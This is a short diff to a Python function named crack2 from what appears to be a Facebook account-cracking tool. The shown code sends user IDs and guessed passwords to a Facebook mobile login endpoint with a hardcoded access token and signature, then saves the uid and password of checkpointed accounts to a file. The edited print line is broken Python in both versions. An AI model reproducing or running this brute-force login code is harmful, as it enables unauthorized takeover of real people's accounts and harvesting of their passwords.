@@ -340,7 +340,7 @@ def crack2():
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
-		                print("[CP] "+uid+" | "+pass2 | "+name)
+		                print("[CP] "+uid+" | "+pass2 | +name)
 		                cp=open("save/cp.txt","a")
 		                cp.write(uid+" | "+pass2+"\n")
 		                cp.close()
